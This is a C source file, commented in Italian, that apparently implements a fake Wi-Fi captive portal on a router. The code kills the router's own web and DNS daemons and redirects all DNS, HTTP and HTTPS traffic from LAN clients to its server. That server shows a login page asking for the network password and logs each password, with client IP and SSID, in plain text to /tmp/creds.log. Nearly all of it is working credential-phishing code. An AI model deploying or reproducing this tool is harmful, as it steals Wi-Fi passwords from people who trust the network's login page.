#include <arpa/inet.h>
#include <ctype.h>
#include <fcntl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define PORT 80
#define BUFFER_SIZE 4096
#define AUTHORIZED_CLIENTS_FILE "/tmp/authorized_clients"

/* ────────────────────────────────────────────────────────────
 * URL decode  (%20 → ' ',  + → ' ')
 * ─────────────────────────────────────────────────────────── */
void url_decode(char *dst, const char *src) {
    char a, b;
    while (*src) {
        if ((*src == '%') && ((a = src[1]) && (b = src[2])) &&
                isxdigit(a) && isxdigit(b)) {
            if (a >= 'a') a -= 'a' - 'A';
            if (a >= 'A') a -= ('A' - 10); else a -= '0';
            if (b >= 'a') b -= 'a' - 'A';
            if (b >= 'A') b -= ('A' - 10); else b -= '0';
            *dst++ = 16 * a + b;
            src += 3;
        } else if (*src == '+') {
            *dst++ = ' '; src++;
        } else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';
}

/* ────────────────────────────────────────────────────────────
 * Estrae un parametro da query string / body POST
 * ─────────────────────────────────────────────────────────── */
int get_param(const char *data, const char *name, char *val, int max) {
    if (!data || !name) return 0;
    const char *p = data;
    int nlen = strlen(name);
    while ((p = strstr(p, name))) {
        if (p == data || *(p - 1) == '&') {
            if (*(p + nlen) == '=') {
                const char *vs = p + nlen + 1;
                const char *ve = strchr(vs, '&');
                int len = ve ? (ve - vs) : strlen(vs);
                if (len >= max) len = max - 1;
                strncpy(val, vs, len);
                val[len] = '\0';
                return 1;
            }
        }
        p += nlen;
    }
    return 0;
}

/* ────────────────────────────────────────────────────────────
 * Legge file intero → stringa allocata (o NULL)
 * ─────────────────────────────────────────────────────────── */
char *read_file(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *buf = malloc(size + 1);
    if (buf) { size_t n = fread(buf, 1, size, f); buf[n] = '\0'; }
    fclose(f);
    return buf;
}

/* ────────────────────────────────────────────────────────────
 * Risposta HTTP
 * ─────────────────────────────────────────────────────────── */
void send_response(int fd, const char *status, const char *ctype,
                   const char *body) {
    char hdr[1024];
    int blen = body ? strlen(body) : 0;
    snprintf(hdr, sizeof(hdr),
             "HTTP/1.0 %s\r\n"
             "Content-Type: %s\r\n"
             "Content-Length: %d\r\n"
             "Connection: close\r\n\r\n",
             status, ctype, blen);
    send(fd, hdr, strlen(hdr), 0);
    if (blen > 0) send(fd, body, blen, 0);
}

/* ────────────────────────────────────────────────────────────
 * Whitelist IP autorizzati
 * ─────────────────────────────────────────────────────────── */
int is_authorized(const char *ip) {
    FILE *f = fopen(AUTHORIZED_CLIENTS_FILE, "r");
    if (!f) return 0;
    char line[64];
    while (fgets(line, sizeof(line), f)) {
        int l = strlen(line);
        while (l > 0 && (line[l-1] == '\n' || line[l-1] == '\r')) line[--l] = '\0';
        if (strcmp(line, ip) == 0) { fclose(f); return 1; }
    }
    fclose(f);
    return 0;
}

/*
 * Aggiunge l'IP alla whitelist e inserisce in cima alla catena CAPTIVE
 * una regola RETURN che fa bypassare il DNAT per quel client.
 * Così il client autorizzato usa DNS reale e raggiunge internet direttamente.
 */
void authorize_ip(const char *ip) {
    if (is_authorized(ip)) return;

    /* Scrivi nel file */
    FILE *f = fopen(AUTHORIZED_CLIENTS_FILE, "a");
    if (f) { fprintf(f, "%s\n", ip); fclose(f); }

    /* iptables: inserisci RETURN prima delle regole DNAT */
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
             "iptables -t nat -I CAPTIVE 1 -s %s -j RETURN", ip);
    system(cmd);
}

/* ────────────────────────────────────────────────────────────
 * Recupera l'SSID dalla sorgente disponibile
 * ─────────────────────────────────────────────────────────── */
char *get_ssid(void) {
    /* 1. /tmp/ath0.ap_bss → ssid="..." */
    FILE *f = fopen("/tmp/ath0.ap_bss", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "ssid=", 5) == 0) {
                char *val = line + 5;
                if (*val == '"') val++;
                int l = strlen(val);
                while (l > 0 && (val[l-1] == '\n' || val[l-1] == '\r' || val[l-1] == '"'))
                    val[--l] = '\0';
                char *ret = strdup(val);
                fclose(f);
                return ret;
            }
        }
        fclose(f);
    }
    /* 2. /tmp/portal_ssid */
    char *s = read_file("/tmp/portal_ssid");
    if (s) return s;
    /* 3. /etc/ath/wsc_config.txt → SSID=... */
    f = fopen("/etc/ath/wsc_config.txt", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "SSID=", 5) == 0) {
                char *val = line + 5;
                int l = strlen(val);
                while (l > 0 && (val[l-1] == '\n' || val[l-1] == '\r'))
                    val[--l] = '\0';
                char *ret = strdup(val);
                fclose(f);
                return ret;
            }
        }
        fclose(f);
    }
    return strdup("WiFi");
}

/* ────────────────────────────────────────────────────────────
 * Ottieni IP di br0 via ioctl (nessun sed/shell)
 * Ritorna 1 se ha trovato l'IP, 0 se fallisce.
 * ─────────────────────────────────────────────────────────── */
int get_router_ip(char *out, size_t out_len) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return 0;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "br0", IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFADDR, &ifr) == 0) {
        struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
        const char *ip = inet_ntoa(sin->sin_addr);
        if (ip && strlen(ip) > 0 && strcmp(ip, "0.0.0.0") != 0) {
            strncpy(out, ip, out_len - 1);
            out[out_len - 1] = '\0';
            close(sock);
            return 1;
        }
    }
    close(sock);
    return 0;
}

/* ────────────────────────────────────────────────────────────
 * Configura iptables DNAT per intercettare tutto il traffico
 * dei client LAN e reindirizzarlo al nostro server.
 * ─────────────────────────────────────────────────────────── */
void setup_iptables(const char *router_ip) {
    char cmd[512];

    /* Pulisci vecchie regole */
    system("iptables -t nat -D PREROUTING -i br0 -j CAPTIVE 2>/dev/null");
    system("iptables -t nat -F CAPTIVE 2>/dev/null");
    system("iptables -t nat -X CAPTIVE 2>/dev/null");

    /* Crea catena CAPTIVE */
    system("iptables -t nat -N CAPTIVE");

    /* DNS (UDP + TCP 53) → nostro dnsd */
    snprintf(cmd, sizeof(cmd),
        "iptables -t nat -A CAPTIVE -p udp --dport 53 -j DNAT --to %s:53", router_ip);
    system(cmd);
    snprintf(cmd, sizeof(cmd),
        "iptables -t nat -A CAPTIVE -p tcp --dport 53 -j DNAT --to %s:53", router_ip);
    system(cmd);

    /* HTTP (TCP 80) → nostro server porta 80 */
    snprintf(cmd, sizeof(cmd),
        "iptables -t nat -A CAPTIVE -p tcp --dport 80 -j DNAT --to %s:80", router_ip);
    system(cmd);

    /* HTTPS (TCP 443) → nostro server porta 80 (mostra pagina portal) */
    snprintf(cmd, sizeof(cmd),
        "iptables -t nat -A CAPTIVE -p tcp --dport 443 -j DNAT --to %s:80", router_ip);
    system(cmd);

    /* Aggancia la catena in PREROUTING per tutto il traffico su br0 */
    system("iptables -t nat -A PREROUTING -i br0 -j CAPTIVE");
}

/* ────────────────────────────────────────────────────────────
 * Serve la pagina del captive portal con sostituzione __SSID__
 * ─────────────────────────────────────────────────────────── */
void serve_portal(int fd, const char *ssid) {
    char *tmpl = read_file("/etc/portal/template.html");
    if (!tmpl) tmpl = read_file("/tmp/portal/template.html");

    if (tmpl) {
        char *pos = strstr(tmpl, "__SSID__");
        if (pos) {
            int off = pos - tmpl;
            int slen = strlen(ssid);
            int tlen = strlen(tmpl);
            char *out = malloc(tlen + slen + 10);
            if (out) {
                strncpy(out, tmpl, off); out[off] = '\0';
                strcat(out, ssid);
                strcat(out, pos + 8); /* salta i 8 char di "__SSID__" */
                send_response(fd, "200 OK", "text/html", out);
                free(out);
            } else {
                send_response(fd, "200 OK", "text/html", tmpl);
            }
        } else {
            send_response(fd, "200 OK", "text/html", tmpl);
        }
        free(tmpl);
    } else {
        /* Fallback inline */
        char fb[1024];
        snprintf(fb, sizeof(fb),
                 "<!DOCTYPE html><html><head><title>Wi-Fi Login</title>"
                 "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"></head>"
                 "<body><h2>Accedi alla Rete</h2><p>SSID: <b>%s</b></p>"
                 "<form action=\"/connect\" method=\"POST\">"
                 "<input type=\"password\" name=\"p\" placeholder=\"Password\" required>"
                 "<br><br><input type=\"submit\" value=\"Accedi\">"
                 "</form></body></html>", ssid);
        send_response(fd, "200 OK", "text/html", fb);
    }
}

/* ────────────────────────────────────────────────────────────
 * main
 * ─────────────────────────────────────────────────────────── */
int main(void) {
    /* PATH completa per tutti i processi figli */
    setenv("PATH", "/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/additional", 1);

    /* Fork: il processo padre esce subito, il figlio diventa daemon */
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    if (setsid() < 0) exit(EXIT_FAILURE);

    /* Ferma httpd e dnsd già in esecuzione */
    system("killall -9 httpd 2>/dev/null");
    system("killall -9 dnsd 2>/dev/null");

    /* ── Aspetta che br0 abbia un IP (max 30 secondi) ───── */
    char router_ip[64] = "192.168.0.1";
    for (int i = 0; i < 30; i++) {
        if (get_router_ip(router_ip, sizeof(router_ip))) break;
        sleep(1);
    }

    /* ── DNS spoofing ────────────────────────────────────── */
    FILE *dns_f = fopen("/tmp/dnsd.conf", "w");
    if (dns_f) { fprintf(dns_f, "* %s\n", router_ip); fclose(dns_f); }
    char dns_cmd[256];
    snprintf(dns_cmd, sizeof(dns_cmd),
             "dnsd -c /tmp/dnsd.conf -i %s &", router_ip);
    system(dns_cmd);

    /* ── iptables DNAT ───────────────────────────────────── */
    setup_iptables(router_ip);

    /* ── Server TCP porta 80 ─────────────────────────────── */
    int server_fd;
    struct sockaddr_in addr;
    int opt = 1;

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        exit(EXIT_FAILURE);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
        exit(EXIT_FAILURE);
    if (listen(server_fd, 10) < 0)
        exit(EXIT_FAILURE);

    char *req_buf = malloc(BUFFER_SIZE);
    if (!req_buf) exit(EXIT_FAILURE);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t addrlen = sizeof(client_addr);
        int cfd = accept(server_fd, (struct sockaddr *)&client_addr, &addrlen);
        if (cfd < 0) continue;

        /* IP client */
        char client_ip[64] = "unknown";
        char *ip_s = inet_ntoa(client_addr.sin_addr);
        if (ip_s) strncpy(client_ip, ip_s, sizeof(client_ip) - 1);

        memset(req_buf, 0, BUFFER_SIZE);
        int n = recv(cfd, req_buf, BUFFER_SIZE - 1, 0);
        if (n <= 0) { close(cfd); continue; }

        /* ── Parsing request line ──────────────────────── */
        char method[16]    = {0};
        char fullpath[512] = {0};
        sscanf(req_buf, "%15s %511s", method, fullpath);

        char path[512] = {0};
        char *qm = strchr(fullpath, '?');
        if (qm) strncpy(path, fullpath, qm - fullpath);
        else     strcpy(path, fullpath);

        /* ── Body POST ──────────────────────────────────── */
        char *post_body = NULL;
        char *bp = strstr(req_buf, "\r\n\r\n");
        if (bp) post_body = bp + 4;
        else { bp = strstr(req_buf, "\n\n"); if (bp) post_body = bp + 2; }

        /* ── Routing ────────────────────────────────────── */
        if (strcmp(path, "/connect") == 0 && strcmp(method, "POST") == 0) {
            /* Gestione credenziali */
            char raw_p[256] = {0}, dec_p[256] = {0};
            if (post_body && get_param(post_body, "p", raw_p, sizeof(raw_p))) {
                url_decode(dec_p, raw_p);

                char *ssid = get_ssid();
                time_t t = time(NULL);
                struct tm tm = *localtime(&t);
                char ts[64];
                strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &tm);

                FILE *log_f = fopen("/tmp/creds.log", "a");
                if (log_f) {
                    fprintf(log_f, "[%s] ip=%s ssid=%s pass=%s\n",
                            ts, client_ip, ssid ? ssid : "WiFi", dec_p);
                    fclose(log_f);
                }
                if (ssid) free(ssid);

                /* Autorizza l'IP: iptables RETURN bypassa il DNAT */
                authorize_ip(client_ip);
            }

            const char *ok =
                "<!DOCTYPE html><html><head>"
                "<meta http-equiv=\"refresh\" content=\"3;url=http://www.google.com\">"
                "<title>Accesso effettuato</title></head>"
                "<body><h2>Connessione effettuata!</h2>"
                "<p>Verrai reindirizzato a breve...</p></body></html>";
            send_response(cfd, "200 OK", "text/html", ok);

        } else {
            /* Qualsiasi altra richiesta → pagina del captive portal.
             * (I client autorizzati non raggiungono mai questo ramo
             *  perché la regola iptables RETURN li devia prima.) */
            char *ssid = get_ssid();
            serve_portal(cfd, ssid);
            free(ssid);
        }

        close(cfd);
    }

    free(req_buf);
    close(server_fd);
    return 0;
}
